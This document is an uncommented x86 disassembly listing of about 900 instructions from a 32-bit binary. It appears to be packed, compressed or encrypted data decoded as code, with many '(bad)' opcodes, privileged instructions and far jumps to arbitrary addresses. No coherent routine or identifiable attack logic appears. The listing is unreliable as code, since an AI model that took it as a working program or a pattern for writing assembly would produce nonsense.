  41b267:	in     eax,0x87
  41b269:	xchg   ecx,eax
  41b26a:	sub    edx,DWORD PTR [eax+ebp*1+0x3]
  41b26e:	sbb    DWORD PTR [edx+0x437e9b23],ebx
  41b274:	or     eax,0x1fa75ef8
  41b279:	pop    ebx
  41b27a:	iret   
  41b27b:	into   
  41b27c:	lea    ebx,[edi-0x4c4d162c]
  41b282:	xor    edi,ebp
  41b284:	int3   
  41b285:	lahf   
  41b286:	fidiv  WORD PTR [esi+ebp*8+0x1bf3fe20]
  41b28d:	inc    ebx
  41b28e:	inc    ebx
  41b28f:	daa    
  41b290:	xchg   esp,eax
  41b291:	rol    BYTE PTR [ecx-0x5530b5b6],cl
  41b297:	mov    DWORD PTR [ebx+0xe8ac597],ecx
  41b29d:	push   0xffffff8f
  41b29f:	push   0x7d
  41b2a1:	pop    ecx
  41b2a2:	jge    0x41b2f0
  41b2a4:	jns    0x41b227
  41b2a6:	pop    esp
  41b2a7:	push   0xfffffff5
  41b2a9:	cs xchg ebx,eax
  41b2ab:	mov    ah,0x4a
  41b2ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ae:	mov    bh,0x70
  41b2b0:	sti    
  41b2b1:	pop    eax
  41b2b2:	inc    ebx
  41b2b3:	mov    ebp,0x831c92f
  41b2b8:	and    DWORD PTR [edx-0x33],0x7d
  41b2bc:	sbb    al,BYTE PTR [eax+0x216542be]
  41b2c2:	or     eax,0xfc12b77f
  41b2c7:	outs   dx,BYTE PTR ds:[esi]
  41b2c8:	and    al,0x55
  41b2ca:	iret   
  41b2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2cc:	fisub  DWORD PTR [eax+0x15a9e0d1]
  41b2d2:	pop    esp
  41b2d3:	(bad)  
  41b2d4:	jecxz  0x41b311
  41b2d6:	das    
  41b2d7:	fnsave [ebp+0x7c]
  41b2da:	ins    BYTE PTR es:[edi],dx
  41b2db:	fwait
  41b2dc:	mov    bl,BYTE PTR [ebx+0x72aa0314]
  41b2e2:	ins    BYTE PTR es:[edi],dx
  41b2e3:	push   ebp
  41b2e4:	push   ecx
  41b2e5:	xchg   ebp,eax
  41b2e6:	cmc    
  41b2e7:	loopne 0x41b2a2
  41b2e9:	ret    0xda58
  41b2ec:	repnz fwait
  41b2ee:	or     esp,esi
  41b2f0:	inc    ebp
  41b2f1:	cwde   
  41b2f2:	clc    
  41b2f3:	inc    ecx
  41b2f4:	inc    ecx
  41b2f5:	adc    DWORD PTR [ebx+ebp*1+0x12f319b5],ebp
  41b2fc:	in     eax,0x10
  41b2fe:	cmp    eax,DWORD PTR [eax+0x6e]
  41b301:	pop    ecx
  41b302:	jns    0x41b317
  41b304:	stc    
  41b305:	add    bh,0x90
  41b308:	mov    edi,?
  41b30a:	mov    esp,0xf29520c6
  41b30f:	xchg   esi,eax
  41b310:	push   ebp
  41b311:	imul   ecx,DWORD PTR [esi-0x22],0xb379b337
  41b318:	bound  esi,QWORD PTR [ecx]
  41b31a:	int    0x96
  41b31c:	ja     0x41b339
  41b31e:	mov    dl,0x4b
  41b320:	sbb    al,al
  41b322:	loopne 0x41b3a2
  41b324:	(bad)  
  41b325:	call   0x3da4:0x1d094ade
  41b32c:	or     eax,0xff7ee82
  41b331:	xor    dh,cl
  41b333:	jo     0x41b319
  41b335:	cmp    DWORD PTR ds:0x9222467f,esi
  41b33b:	repz out 0xdd,eax
  41b33e:	mov    ecx,0x4ed0fb2f
  41b343:	leave  
  41b344:	mov    cs,WORD PTR [bp+di]
  41b347:	sub    DWORD PTR [esi],edx
  41b349:	fwait
  41b34a:	sub    dh,ah
  41b34c:	shr    DWORD PTR [edx+0x3aa043c1],0x58
  41b353:	je     0x41b319
  41b355:	mov    al,0x57
  41b357:	pop    ecx
  41b358:	pop    esp
  41b359:	xor    ebp,DWORD PTR [edi]
  41b35b:	xchg   esp,eax
  41b35c:	adc    eax,0x2974dac0
  41b361:	inc    ebp
  41b362:	push   es
  41b363:	clc    
  41b364:	rol    DWORD PTR [eax],cl
  41b366:	xor    eax,0x6ed31b7
  41b36b:	les    edx,FWORD PTR [edi]
  41b36d:	jg     0x41b36d
  41b36f:	sbb    BYTE PTR [ecx-0x32b76978],0x8f
  41b376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b377:	mov    ds:0x8e51322b,al
  41b37c:	sbb    eax,0x4f68a1ad
  41b381:	mov    edx,0x2ee4399e
  41b386:	test   al,0x85
  41b388:	cld    
  41b389:	cwde   
  41b38a:	loop   0x41b383
  41b38c:	sub    esi,DWORD PTR [eax]
  41b38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38f:	call   0x6bf9:0x3c3e11c2
  41b396:	add    BYTE PTR [ebx+eiz*1],0x3c
  41b39a:	les    esi,FWORD PTR [ebp+0x285268b4]
  41b3a0:	sub    BYTE PTR [ebx+0x5a19b8c2],ah
  41b3a6:	sbb    esp,ebx
  41b3a8:	stos   BYTE PTR es:[edi],al
  41b3a9:	test   al,0x2d
  41b3ab:	in     al,0x4f
  41b3ad:	dec    edi
  41b3ae:	push   ebx
  41b3af:	fiadd  DWORD PTR [esi+ebp*2]
  41b3b2:	rcr    DWORD PTR [esi-0x21715209],cl
  41b3b8:	lahf   
  41b3b9:	inc    esi
  41b3ba:	js     0x41b395
  41b3bc:	mov    ebx,DWORD PTR [ecx]
  41b3be:	cdq    
  41b3bf:	daa    
  41b3c0:	cmp    BYTE PTR [esi-0x5135eff5],bl
  41b3c6:	cmp    edi,esp
  41b3c8:	fidivr WORD PTR [esp+ebp*8-0x224a7c04]
  41b3cf:	adc    al,0xe1
  41b3d1:	fdivr  QWORD PTR [ebp+ebp*8-0x9bcc3c6]
  41b3d8:	(bad)  [esi-0x35]
  41b3db:	sbb    cl,BYTE PTR [ebx+0x22]
  41b3de:	call   0xe5104dc6
  41b3e3:	sbb    al,0xa5
  41b3e5:	ss mov ch,al
  41b3e8:	out    0x71,eax
  41b3ea:	test   eax,0xbb43540
  41b3ef:	mov    ch,0x79
  41b3f1:	stos   DWORD PTR es:[edi],eax
  41b3f2:	and    cl,ah
  41b3f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3f5:	imul   ecx,DWORD PTR [esi],0xffffff87
  41b3f8:	push   edi
  41b3f9:	retf   
  41b3fa:	mov    dh,0xc4
  41b3fc:	sub    DWORD PTR [ecx],edi
  41b3fe:	mov    ds:0xe6165a6e,eax
  41b403:	movsx  ebx,BYTE PTR [ebp+0x335f0fae]
  41b40a:	sub    BYTE PTR [ebp+ebx*8-0x5e],ch
  41b40e:	pop    edx
  41b40f:	xchg   DWORD PTR [edi+eax*2-0x32cca47a],edi
  41b416:	inc    ebp
  41b417:	retf   0xf6ed
  41b41a:	test   al,0xae
  41b41c:	mov    edx,0x44461c5c
  41b421:	fnsave [ebp+0x6fccfbd0]
  41b427:	push   esi
  41b428:	and    BYTE PTR [esi-0x34],dl
  41b42b:	mov    ah,0xc6
  41b42d:	rol    DWORD PTR [ecx+esi*1-0x3a],0x7b
  41b432:	mov    bl,0xb4
  41b434:	jb     0x41b48a
  41b436:	jo     0x41b47b
  41b438:	jns    0x41b3ed
  41b43a:	int3   
  41b43b:	outs   dx,DWORD PTR ds:[esi]
  41b43c:	xor    ah,dl
  41b43e:	xor    al,0x96
  41b440:	sbb    eax,0x1359103c
  41b445:	mov    ebx,0x4cc3d174
  41b44a:	mov    dl,0xe0
  41b44c:	or     eax,esi
  41b44e:	cmp    al,0x77
  41b450:	mov    ebx,0x908654b2
  41b455:	nop
  41b456:	sbb    DWORD PTR [esi-0x73],ebp
  41b459:	add    eax,0xabbba85f
  41b45e:	xchg   DWORD PTR [edx+eax*4+0x43],edx
  41b462:	add    BYTE PTR [ebp-0x32525df4],bl
  41b468:	and    al,BYTE PTR [eax+eiz*4-0x3e]
  41b46c:	(bad)  
  41b46d:	call   ebp
  41b46f:	and    DWORD PTR [eax-0x43714719],esi
  41b475:	data16 addr16 cld 
  41b478:	aad    0x50
  41b47a:	add    DWORD PTR [eax+0x5],0x4e812bbe
  41b481:	or     DWORD PTR [edx+0x16],ebx
  41b484:	inc    ebx
  41b485:	in     eax,0x88
  41b487:	add    eax,0x98bebaea
  41b48c:	ins    DWORD PTR es:[edi],dx
  41b48d:	cmp    BYTE PTR [eax+edx*8],bl
  41b490:	dec    ecx
  41b491:	and    BYTE PTR [ecx+0x778fe8aa],cl
  41b497:	ja     0x41b42b
  41b499:	lea    eax,[ecx]
  41b49b:	sbb    ebx,edi
  41b49d:	retf   0xe5b9
  41b4a0:	xor    bh,BYTE PTR [ebx]
  41b4a2:	gs scas eax,DWORD PTR es:[edi]
  41b4a4:	rol    BYTE PTR [eax],0xaf
  41b4a7:	les    ebp,FWORD PTR [edi]
  41b4a9:	mov    eax,ds:0x352fde64
  41b4ae:	jmp    0x41b4c8
  41b4b0:	loope  0x41b52a
  41b4b2:	mov    eax,ds:0x5e807a4
  41b4b7:	and    BYTE PTR [ebp+0x6f],bl
  41b4ba:	push   ecx
  41b4bb:	adc    edi,edi
  41b4bd:	pop    ss
  41b4be:	push   edx
  41b4bf:	mov    bh,BYTE PTR [ebp+esi*4-0x3d9394f2]
  41b4c6:	sbb    eax,0xa9c06952
  41b4cb:	mov    edi,0x446e4308
  41b4d0:	(bad)  
  41b4d1:	mov    gs,edx
  41b4d3:	sbb    al,0xc
  41b4d5:	into   
  41b4d6:	xchg   BYTE PTR [eax],al
  41b4d8:	(bad)  
  41b4d9:	out    dx,al
  41b4da:	pop    edi
  41b4db:	dec    edx
  41b4dc:	daa    
  41b4dd:	data16 fwait
  41b4df:	dec    ebp
  41b4e0:	aas    
  41b4e1:	xor    al,0xbf
  41b4e3:	js     0x41b4a8
  41b4e5:	sbb    eax,0xf6f46ed2
  41b4ea:	sub    edx,edi
  41b4ec:	pop    ebp
  41b4ed:	stos   DWORD PTR es:[edi],eax
  41b4ee:	leave  
  41b4ef:	ror    DWORD PTR [ecx+0x1a86ec2c],cl
  41b4f5:	aaa    
  41b4f6:	ror    bh,0x33
  41b4f9:	cmp    al,0x15
  41b4fb:	fist   WORD PTR [edx]
  41b4fd:	jg     0x31bbbf13
  41b503:	cs xchg ecx,eax
  41b505:	(bad)  
  41b506:	lock repnz add al,BYTE PTR [ebx-0x27]
  41b50b:	loopne 0x41b4ef
  41b50d:	xchg   BYTE PTR [esp+ebx*2-0x47dfcc6b],bh
  41b514:	repz push ebp
  41b516:	mov    eax,0xc8ffaaa5
  41b51b:	(bad)  
  41b51c:	mov    bl,0x48
  41b51e:	ja     0x41b550
  41b520:	rcr    BYTE PTR [ebx],1
  41b522:	add    edx,DWORD PTR [ebp+0x6e]
  41b525:	int3   
  41b526:	fisubr WORD PTR [ebx]
  41b528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b529:	cmp    DWORD PTR [ecx-0x51d329f0],esp
  41b52f:	and    cl,BYTE PTR [ebx+ecx*2-0x53]
  41b533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b534:	dec    edi
  41b535:	xchg   esi,eax
  41b536:	fisubr WORD PTR [ebx]
  41b538:	idiv   ebx
  41b53a:	mov    ebx,0xf427e64b
  41b53f:	and    eax,0xfa23c46b
  41b544:	jmp    0x41b5b7
  41b546:	and    ecx,eax
  41b548:	imul   ebp,DWORD PTR [edi],0xa
  41b54b:	adc    esp,DWORD PTR [edx+0x68]
  41b54e:	les    ebx,FWORD PTR [ebp+0x58]
  41b551:	mov    al,0x25
  41b553:	dec    eax
  41b554:	lea    eax,[edx]
  41b556:	sbb    DWORD PTR [ecx-0x651a3b42],ecx
  41b55c:	jbe    0x41b521
  41b55e:	aaa    
  41b55f:	(bad)  
  41b560:	jge    0x41b551
  41b562:	sbb    BYTE PTR [ecx-0x1f1ab328],cl
  41b568:	cmp    eax,0x888c00bb
  41b56d:	add    eax,0xa1d0730f
  41b572:	push   ebx
  41b573:	shr    DWORD PTR [ebx],cl
  41b575:	xchg   BYTE PTR [eax+0x55],ah
  41b578:	mov    BYTE PTR [ebx-0xcf788d6],dl
  41b57e:	pushf  
  41b57f:	mul    DWORD PTR [ecx]
  41b581:	lock js 0x41b52a
  41b584:	les    eax,FWORD PTR [ebp-0x12d459c7]
  41b58a:	hlt    
  41b58b:	adc    cl,BYTE PTR [ecx-0x56b02b34]
  41b591:	mov    ah,0xf2
  41b593:	cmc    
  41b594:	jmp    0x20c36c9f
  41b599:	rol    BYTE PTR [edx+0x661983b7],cl
  41b59f:	adc    BYTE PTR [ebx+edi*4+0x73],0x5e
  41b5a4:	jmp    0xf70c:0x5a8307b4
  41b5ab:	lea    ecx,[esi]
  41b5ad:	sbb    al,0x29
  41b5af:	jo     0x41b551
  41b5b1:	rol    bl,1
  41b5b3:	mov    edx,0x50e7011a
  41b5b8:	sbb    eax,DWORD PTR [edx-0x73d0078c]
  41b5be:	dec    edi
  41b5bf:	inc    ecx
  41b5c0:	sti    
  41b5c1:	pop    ds
  41b5c2:	xlat   BYTE PTR ds:[ebx]
  41b5c3:	es mov esi,0x313a1a4
  41b5c9:	outs   dx,DWORD PTR ds:[esi]
  41b5ca:	dec    esp
  41b5cb:	jmp    0x41b624
  41b5cd:	mov    bh,ah
  41b5cf:	mov    bh,0xe7
  41b5d1:	fsub   QWORD PTR [edx+0x1b]
  41b5d4:	shl    DWORD PTR [edx+0x22],0x53
  41b5d8:	ret    
  41b5d9:	outs   dx,BYTE PTR ds:[esi]
  41b5da:	sub    al,0x57
  41b5dc:	popa   
  41b5dd:	retf   
  41b5de:	jmp    0x436cd670
  41b5e3:	push   cs
  41b5e4:	es jo  0x41b5b5
  41b5e7:	xor    DWORD PTR [edx+0x770ec763],ebx
  41b5ed:	sub    al,0x86
  41b5ef:	and    esi,DWORD PTR [esi]
  41b5f1:	push   ss
  41b5f2:	add    esp,DWORD PTR [eax]
  41b5f4:	or     DWORD PTR [ecx],edx
  41b5f6:	and    DWORD PTR [edx-0x496c6fc9],0x69371fbb
  41b600:	imul   ecx,DWORD PTR [edx+ebp*2+0x1],0x548ff66
  41b608:	sti    
  41b609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b60a:	add    al,BYTE PTR [edi]
  41b60c:	ins    BYTE PTR es:[edi],dx
  41b60d:	xchg   esp,eax
  41b60e:	ret    
  41b60f:	jbe    0x41b632
  41b611:	jmp    0x41b5cb
  41b613:	pop    eax
  41b614:	retf   0x5bb6
  41b617:	pop    esi
  41b618:	xchg   dl,dl
  41b61a:	lds    ecx,FWORD PTR [ebx+0x1f]
  41b61d:	push   cs
  41b61e:	dec    ecx
  41b61f:	loope  0x41b5e0
  41b621:	jb     0x41b68a
  41b623:	mov    ah,BYTE PTR [ecx+0x45243a7e]
  41b629:	(bad)  
  41b62a:	mul    BYTE PTR [esi+eiz*8]
  41b62d:	mov    ecx,0x5ecccafb
  41b632:	and    esi,edx
  41b634:	retf   
  41b635:	lea    ebp,[edx-0x77ec82af]
  41b63b:	das    
  41b63c:	fistp  DWORD PTR [eax-0x70f708ae]
  41b642:	clc    
  41b643:	xchg   ebx,eax
  41b644:	jge    0x41b66d
  41b646:	mov    ds:0xc2fef95b,eax
  41b64b:	cmp    DWORD PTR [edx+eiz*2+0x4a51c424],edx
  41b652:	mov    ah,ch
  41b654:	(bad)  
  41b655:	dec    edx
  41b656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b658:	push   edx
  41b659:	adc    ebp,DWORD PTR [edx-0x253fb3a2]
  41b65f:	mov    al,ds:0x5d3de525
  41b664:	aad    0x68
  41b666:	pop    edx
  41b667:	push   ds
  41b668:	jle    0x41b6b5
  41b66a:	sar    BYTE PTR [ebp+0x4391b40c],0xe5
  41b671:	sbb    eax,eax
  41b673:	test   esp,esi
  41b675:	inc    edi
  41b676:	mov    ah,0xe7
  41b678:	call   0xa7db495c
  41b67d:	popa   
  41b67e:	fdiv   st(1),st
  41b680:	(bad)  
  41b681:	pushf  
  41b682:	pop    es
  41b683:	adc    edi,esp
  41b685:	add    al,0x21
  41b687:	addr16 repz (bad) 
  41b68a:	cmc    
  41b68b:	sbb    DWORD PTR [ebx+0x3f4263ef],0x6e
  41b692:	push   ss
  41b693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b694:	xchg   ebp,eax
  41b695:	ja     0x41b690
  41b697:	mov    al,0xab
  41b699:	(bad)  
  41b69a:	ins    DWORD PTR es:[edi],dx
  41b69b:	push   edx
  41b69c:	jecxz  0x41b6f5
  41b69e:	mov    ecx,0xaee6e95c
  41b6a3:	sbb    BYTE PTR [ebx+0x2b],bl
  41b6a6:	ss (bad) 
  41b6a8:	mov    ds:0xe4094c8f,eax
  41b6ad:	std    
  41b6ae:	inc    ecx
  41b6af:	hlt    
  41b6b0:	pop    eax
  41b6b1:	fdiv   st(5),st
  41b6b3:	ficom  WORD PTR [esi+0x14764cac]
  41b6b9:	(bad)  
  41b6ba:	ja     0x41b736
  41b6bc:	push   ecx
  41b6bd:	lods   eax,DWORD PTR ds:[esi]
  41b6be:	out    0xfb,al
  41b6c0:	push   edx
  41b6c1:	lods   al,BYTE PTR ds:[esi]
  41b6c2:	push   ss
  41b6c3:	ficomp WORD PTR [edx+0x4d]
  41b6c6:	(bad)  
  41b6c7:	xor    eax,DWORD PTR [eax+edi*1]
  41b6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6cb:	pop    esi
  41b6cc:	and    BYTE PTR [eax],ch
  41b6ce:	mov    WORD PTR [eax+eax*1-0x65498f9c],ds
  41b6d5:	pop    ebx
  41b6d6:	and    DWORD PTR [eax+0x5150dfd2],eax
  41b6dc:	bound  eax,QWORD PTR [eax-0x3d]
  41b6df:	sbb    BYTE PTR [eax],bl
  41b6e1:	imul   edi,DWORD PTR [edx+0x7fa5d68],0xed2f3faa
  41b6eb:	adc    edi,DWORD PTR [ebx-0x4af18c4f]
  41b6f1:	mov    edx,0x634661d
  41b6f6:	mov    al,ds:0xcaf397b4
  41b6fb:	(bad)  
  41b6fc:	rcr    ecx,1
  41b6fe:	pop    esp
  41b6ff:	xlat   BYTE PTR ds:[ebx]
  41b700:	ret    0xe770
  41b703:	mov    edx,0x40649832
  41b708:	lahf   
  41b709:	sub    ebx,esi
  41b70b:	add    al,0xba
  41b70d:	xchg   BYTE PTR [esi],dh
  41b70f:	or     DWORD PTR [ebp+0xa],esi
  41b712:	addr16 inc esi
  41b714:	cdq    
  41b715:	aam    0xd9
  41b717:	into   
  41b718:	xor    DWORD PTR [ebx+0x5ff37aa9],ebp
  41b71e:	jnp    0x41b6e9
  41b720:	in     eax,0xec
  41b722:	inc    ebx
  41b723:	fucomp st(4)
  41b725:	xchg   esp,eax
  41b726:	or     ch,dl
  41b728:	mov    ebp,0xacafd639
  41b72d:	jmp    0x3fde:0x3b2e78f0
  41b734:	loopne 0x41b781
  41b736:	cdq    
  41b737:	pop    esp
  41b738:	pushf  
  41b739:	int    0xa1
  41b73b:	jne    0x41b756
  41b73d:	add    eax,0xffffffe7
  41b740:	jne    0x41b6ee
  41b742:	aaa    
  41b743:	xor    BYTE PTR [eax-0xbcfe265],cl
  41b749:	push   eax
  41b74a:	std    
  41b74b:	jno    0x41b746
  41b74d:	or     DWORD PTR [eax+esi*4],esi
  41b750:	(bad)  
  41b751:	fsub   QWORD PTR [ebx+0x11]
  41b754:	sahf   
  41b755:	repnz cld 
  41b757:	dec    eax
  41b758:	rcpps  xmm5,XMMWORD PTR [edi+0x46]
  41b75c:	adc    al,0xb
  41b75e:	popa   
  41b75f:	sub    BYTE PTR [eax],bh
  41b761:	in     eax,dx
  41b762:	mov    DWORD PTR [ecx],esi
  41b764:	hlt    
  41b765:	aaa    
  41b766:	sar    dh,cl
  41b768:	push   edi
  41b769:	leave  
  41b76a:	mov    ah,0x49
  41b76c:	rcl    DWORD PTR [edi-0x30],cl
  41b76f:	and    al,dh
  41b771:	sbb    ch,dh
  41b773:	mov    esi,cr4
  41b776:	faddp  st(6),st
  41b778:	sbb    dl,bh
  41b77a:	sahf   
  41b77b:	bound  ebx,QWORD PTR [edx+ebp*2]
  41b77e:	fmul   DWORD PTR [esi-0xefed83e]
  41b784:	inc    esp
  41b785:	push   edi
  41b786:	dec    esi
  41b787:	xor    BYTE PTR [ecx],dh
  41b789:	adc    BYTE PTR [edx-0x7a093ba],cl
  41b78f:	lods   al,BYTE PTR ds:[esi]
  41b790:	enter  0xc46a,0x6d
  41b794:	retf   0x3e77
  41b797:	mov    ds:0xd49edba8,al
  41b79c:	or     eax,0x3c5445ab
  41b7a1:	push   cs
  41b7a2:	push   ebp
  41b7a3:	inc    eax
  41b7a4:	jno    0x41b74b
  41b7a6:	fst    st(2)
  41b7a8:	inc    edi
  41b7a9:	into   
  41b7aa:	or     eax,0x5301aaf
  41b7af:	adc    eax,DWORD PTR ds:0x5730aaae
  41b7b5:	pop    ds
  41b7b6:	sub    eax,0xc5cf473
  41b7bb:	mov    ebx,0x1ff761c3
  41b7c0:	outs   dx,BYTE PTR ds:[esi]
  41b7c1:	cmp    ecx,DWORD PTR [esi-0x2b]
  41b7c4:	xor    DWORD PTR [edi+0x11],esp
  41b7c7:	push   esi
  41b7c8:	mov    ds:0x433aa7f8,al
  41b7cd:	or     al,0xc6
  41b7cf:	xchg   edx,eax
  41b7d0:	xchg   edi,eax
  41b7d1:	inc    esp
  41b7d2:	or     dh,cl
  41b7d4:	dec    esp
  41b7d5:	or     BYTE PTR [edx+0x11a6051],ah
  41b7db:	mov    ebp,0x7d299ac0
  41b7e0:	jmp    0xbedbfa6d
  41b7e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e6:	nop
  41b7e7:	ins    BYTE PTR es:[edi],dx
  41b7e8:	fs icebp 
  41b7ea:	cmp    cl,cl
  41b7ec:	imul   eax,edi,0xacee173d
  41b7f2:	jnp    0x41b82b
  41b7f4:	dec    esp
  41b7f5:	iret   
  41b7f6:	mov    ecx,0x9938c301
  41b7fb:	or     esi,DWORD PTR [eax]
  41b7fd:	fisttp DWORD PTR ds:0x3914b4c1
  41b803:	add    BYTE PTR [edx-0x5f8c7d0a],dh
  41b809:	repnz das 
  41b80b:	popa   
  41b80c:	xchg   BYTE PTR [ebx+0x60],dh
  41b80f:	mov    al,0x8e
  41b811:	mov    ch,0x45
  41b813:	lds    ecx,FWORD PTR [ecx]
  41b815:	xchg   DWORD PTR [ebp-0x70294072],edi
  41b81b:	icebp  
  41b81c:	xchg   edi,eax
  41b81d:	mov    bl,0x63
  41b81f:	sub    esi,ecx
  41b821:	cli    
  41b822:	xchg   esi,eax
  41b823:	in     al,0xce
  41b825:	ror    DWORD PTR [eax+0x9df1fa],0xbc
  41b82c:	jg     0x41b82d
  41b82e:	int    0xca
  41b830:	les    edx,FWORD PTR [ecx+0x76]
  41b833:	pop    esp
  41b834:	dec    eax
  41b835:	jno    0x41b87e
  41b837:	mov    ecx,0x1fc82d1d
  41b83c:	(bad)  
  41b83e:	sub    al,0x1d
  41b840:	push   edx
  41b841:	push   edi
  41b842:	mov    ds:0xa5356e2c,al
  41b847:	iret   
  41b848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b849:	out    0x6f,eax
  41b84b:	sbb    ebx,DWORD PTR [eax-0x32]
  41b84e:	jbe    0x41b880
  41b850:	outs   dx,BYTE PTR ds:[esi]
  41b851:	mov    bl,0x64
  41b853:	(bad)  
  41b854:	pop    ebp
  41b855:	aad    0x99
  41b857:	cli    
  41b858:	cmp    BYTE PTR [esi+0x2c2198c7],ch
  41b85e:	call   DWORD PTR [ebx]
  41b860:	fcomp  DWORD PTR [ecx-0x2d]
  41b863:	retf   
  41b864:	and    bl,BYTE PTR [edx+0x78]
  41b867:	mov    ds:0x64b5da0f,al
  41b86c:	or     ecx,DWORD PTR [ecx-0x2168b3bf]
  41b872:	packuswb mm1,QWORD PTR ds:0x412477b5
  41b879:	aas    
  41b87a:	cli    
  41b87b:	cmp    al,0x67
  41b87d:	aas    
  41b87e:	cdq    
  41b87f:	test   ch,cl
  41b881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b882:	lock ror DWORD PTR [ebx],1
  41b885:	pop    ebx
  41b886:	sbb    BYTE PTR [eax],al
  41b888:	leave  
  41b889:	dec    ebp
  41b88a:	retf   
  41b88b:	mov    al,ds:0xa53ce8aa
  41b890:	dec    ebx
  41b891:	lea    ebp,[edx-0xb]
  41b894:	push   eax
  41b895:	mov    dh,0xcc
  41b897:	test   DWORD PTR [eax+0x7d],eax
  41b89a:	addr16 retf 
  41b89c:	std    
  41b89d:	psubusb mm4,QWORD PTR [ebx]
  41b8a0:	std    
  41b8a1:	cmc    
  41b8a2:	pop    esp
  41b8a3:	aas    
  41b8a4:	jns    0x41b851
  41b8a6:	leave  
  41b8a7:	push   0x57
  41b8a9:	mov    ah,0xeb
  41b8ab:	jmp    0x277a:0x3f2577df
  41b8b2:	push   esi
  41b8b3:	sub    eax,0x70d8fda4
  41b8b8:	add    dl,ah
  41b8ba:	outs   dx,BYTE PTR ds:[esi]
  41b8bb:	iret   
  41b8bc:	ret    
  41b8bd:	and    BYTE PTR [ebp-0x798f3b3d],bl
  41b8c3:	sbb    BYTE PTR [ecx+0x341820e],ch
  41b8c9:	pop    ds
  41b8ca:	imul   esi,DWORD PTR [edi],0x2a
  41b8cd:	test   BYTE PTR [edx+ecx*2-0xe489c15],ah
  41b8d4:	adc    DWORD PTR [esi+0x13],ebx
  41b8d7:	xor    eax,0xf4ca9e30
  41b8dc:	ins    DWORD PTR es:[edi],dx
  41b8dd:	das    
  41b8de:	xlat   BYTE PTR ds:[ebx]
  41b8df:	rcr    DWORD PTR [ebp-0x2],cl
  41b8e2:	shl    DWORD PTR [edx],0xdb
  41b8e5:	add    ecx,DWORD PTR [ebx+0x19e43290]
  41b8eb:	iret   
  41b8ec:	sbb    DWORD PTR [ecx+0xa5e995f],0x24fd8a69
  41b8f6:	or     bl,BYTE PTR [edx-0x780c916c]
  41b8fc:	dec    eax
  41b8fd:	icebp  
  41b8fe:	sbb    BYTE PTR [edi-0x576743ad],ah
  41b904:	inc    esp
  41b905:	mov    edi,0x13aa2069
  41b90a:	pop    edx
  41b90b:	sbb    BYTE PTR [ebx+0xd],0x6f
  41b90f:	dec    esi
  41b910:	enter  0x5b38,0x2c
  41b914:	or     BYTE PTR [ecx],bl
  41b916:	cli    
  41b917:	ror    BYTE PTR [ebx+ecx*4+0x6d],cl
  41b91b:	mov    ch,bh
  41b91d:	inc    edx
  41b91e:	inc    edx
  41b91f:	dec    esi
  41b920:	mov    esp,edi
  41b922:	ins    BYTE PTR es:[edi],dx
  41b923:	jge    0x41b8d2
  41b925:	(bad)  
  41b926:	das    
  41b927:	adc    DWORD PTR [ebp-0x5a],eax
  41b92a:	cdq    
  41b92b:	sar    ah,0xa
  41b92e:	mov    WORD PTR [eax-0x2f529149],?
  41b934:	cmovb  ebp,DWORD PTR [ebp+0x251d147]
  41b93b:	push   edi
  41b93c:	adc    DWORD PTR ds:0x9dbb6a05,esp
  41b942:	adc    eax,0xe65d84b5
  41b947:	pop    edx
  41b948:	adc    al,BYTE PTR [ebx-0x66]
  41b94b:	inc    ebx
  41b94c:	jmp    0x41b903
  41b94e:	push   eax
  41b94f:	add    al,0x6f
  41b951:	(bad)  
  41b952:	push   esi
  41b953:	and    eax,ebx
  41b955:	sub    BYTE PTR [ecx+ecx*1],cl
  41b958:	and    dl,BYTE PTR [esi+edi*2+0x450b5870]
  41b95f:	inc    ebx
  41b960:	mov    eax,0xf91bd6b6
  41b965:	ror    bl,0x9
  41b968:	gs mov cl,0xbf
  41b96b:	mov    al,0x81
  41b96d:	jg     0x41b9e8
  41b96f:	aaa    
  41b970:	pushf  
  41b971:	and    al,0xe
  41b973:	xchg   BYTE PTR [eax+0x602b73ee],dh
  41b979:	inc    ecx
  41b97a:	jge    0x41b9de
  41b97c:	jo     0x41b967
  41b97e:	neg    DWORD PTR [ecx-0x7a]
  41b981:	pushf  
  41b982:	mov    cs,WORD PTR [eax+esi*8]
  41b985:	xor    eax,0xf4164d37
  41b98a:	popf   
  41b98b:	ret    
  41b98c:	sbb    eax,0x4c83c335
  41b991:	dec    ebx
  41b992:	rcl    bh,0xba
  41b995:	cmp    DWORD PTR [edi+0x68],esi
  41b998:	and    eax,DWORD PTR [edi-0x27970d13]
  41b99e:	xchg   edx,eax
  41b99f:	adc    ah,cl
  41b9a1:	xchg   ebx,eax
  41b9a2:	ror    BYTE PTR [ecx-0x2585053d],1
  41b9a8:	fisubr WORD PTR [eax+0x45]
  41b9ab:	xor    DWORD PTR [esi+0x7f],0x846dfb7e
  41b9b2:	sbb    al,BYTE PTR [eax+0x61695600]
  41b9b8:	loopne 0x41b9e7
  41b9ba:	xor    DWORD PTR [esp+esi*4],0xac0f7ca8
  41b9c1:	xor    ecx,esp
  41b9c3:	jmp    0xdbbe:0xe9fe4bcc
  41b9ca:	ret    0xe167
  41b9cd:	test   BYTE PTR [ecx-0xa],ch
  41b9d0:	mov    ebp,0x2605cc55
  41b9d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9d6:	dec    edx
  41b9d7:	adc    al,0xfb
  41b9d9:	pop    ebx
  41b9da:	xchg   DWORD PTR [ebp+0x6a],eax
  41b9dd:	ret    0x85b1
  41b9e0:	pop    esi
  41b9e1:	inc    esp
  41b9e2:	(bad)  
  41b9e3:	push   esp
  41b9e4:	or     esp,DWORD PTR [esi+edx*8-0x12]
  41b9e8:	aad    0xaa
